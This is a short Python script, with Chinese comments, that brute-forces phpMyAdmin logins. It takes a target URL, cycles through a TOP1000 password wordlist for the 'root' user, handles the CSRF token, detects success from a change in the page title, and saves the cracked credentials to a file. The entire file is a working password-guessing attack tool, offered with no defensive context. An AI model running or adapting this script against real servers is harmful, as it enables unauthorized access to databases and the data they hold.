#!/usr/bin/python3
'''
# @Author       : Chr_
# @Date         : 2020-12-06 12:39:57
# @LastEditors  : Chr_
# @LastEditTime : 2020-12-08 13:16:20
# @Description  : PhpMyAdmin爆破脚本
'''

from requests import session
from re import findall
from html import unescape

# PMA地址,例如 http://localhost/index.php
url=input("请输入phpmyadmin地址(格式 http://localhost):")
target = url + '/phpmyadmin/index.php'
user = 'root'
passdic = 'TOP1000.txt'

ss = session()

ss.headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}


def get_token(text) -> str:
    '''获取token'''
    token = findall("name=\"token\" value=\"(.*?)\" />", text)
    return unescape(token[0]) if token else None


def get_title(text) -> str:
    '''获取标题'''
    title = findall('<title>(.*)</title>', text)
    return title[0] if title else None


def try_login(user, pwd, token):
    '''尝试登陆'''
    data = {'pma_username': user,
            'pma_password': pwd,
            'server': 1,
            'target': 'index.php',
            'token': token}
    r = ss.post(url=target, data=data)
    return r.text


def fuck_pma():
    '''爆破'''
    with open(passdic, 'r', encoding='utf-8') as f:
        html = try_login('', '', '')
        title_fail = get_title(html)
        token = get_token(html)
        for line in f:
            pwd = line.strip()
            print(f'[?] 尝试登陆  {user}  {pwd}  ')
            html = try_login(user, pwd, token)
            title = get_title(html)
            token = get_token(html)
            if title != title_fail:
                print(f'[√] 登陆成功  {title}')
                with open('success.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{target}  |  {user}  |  {pwd}\n')
                break
            else:
                print(f'[×] 登陆失败  {title}')


if __name__ == "__main__":
    print(target)
    try:
        fuck_pma()
    except Exception as e:
        print(e)
